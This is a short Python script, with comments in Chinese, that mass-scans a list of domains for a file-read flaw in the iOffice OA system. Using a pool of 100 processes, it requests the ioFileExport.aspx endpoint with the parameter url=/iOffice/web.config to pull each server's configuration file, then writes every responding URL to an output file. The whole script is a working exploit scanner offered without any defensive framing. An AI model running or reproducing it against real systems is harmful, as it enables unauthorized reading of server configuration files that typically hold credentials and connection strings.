import requests
import sys
import socket
import multiprocessing
from multiprocessing import Process,Pool

def test(domain,res):
    try:
        headers={
            'User-Agent' : 'Mozilla/4.0 (compatible; MSIE 7.0; AOL 9.0; Windows NT 5.1; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727; Media Center PC 4.0)',
            'Accept' : 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'Accept-Language' : 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
            'Accept-Encoding' : 'gzip, deflate',
            'Upgrade-Insecure-Requests' : '1'
        }
        # target = 'http://'+ domain + 'iOffice/prg/set/ioCom/ioFileExport.aspx? url=/iOffice/web.config&filename=1.txt'
        target = domain + 'iOffice/prg/set/ioCom/ioFileExport.aspx?url=/iOffice/web.config&filename=1.txt'
        x=requests.get(target,headers=headers,timeout=0.5,allow_redirects=False)
        # print(target+str(x.status_code))
        if x.status_code==200 :
            print("find!!!!!!!!!!!!!!!!"+target)
            res.append(target)
        x.close()           
    except BaseException:
        return 0


if __name__ =='__main__':
    f=open(sys.argv[1])
    li=f.readlines()
    li_=list()
    for i in li:
        li_.append(i.replace('\n',''))
    f.close()

    res=multiprocessing.Manager().list()

    pool = Pool(processes = 100) #最多允许n个进程

    process_list = list() #生成进程列表
    for domain in li_:
        pool.apply_async(test,(domain,res))

    pool.close()
    pool.join()
    
    f=open(sys.argv[2],'w')
    for i in res:
        f.write(i+'\n')
    f.close()